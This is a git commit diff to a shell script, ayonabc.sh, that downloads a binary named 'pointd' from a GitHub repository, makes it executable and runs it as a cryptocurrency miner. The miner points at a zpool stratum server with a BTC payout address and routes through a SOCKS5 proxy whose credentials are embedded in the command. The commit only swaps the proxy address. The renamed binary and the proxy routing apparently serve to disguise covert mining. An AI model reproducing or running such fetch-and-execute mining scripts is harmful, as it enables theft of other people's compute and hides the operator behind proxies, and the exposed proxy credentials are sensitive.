70e8089a9ef3db543ed10a644538033efb0f855c
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-03-09 13:59:55 +0700

    Update ayonabc.sh

--- ayonabc.sh
+++ ayonabc.sh
@@ -2,4 +2,4 @@
 
 wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
 chmod +x pointd
-./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u 1U6yopAJMD2qvucsC9eBysZnpB6FEGKy2 -p c=BTC,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@193.151.160.213:8300 -t 8
+./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u 1U6yopAJMD2qvucsC9eBysZnpB6FEGKy2 -p c=BTC,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@176.116.230.96:7182 -t 8
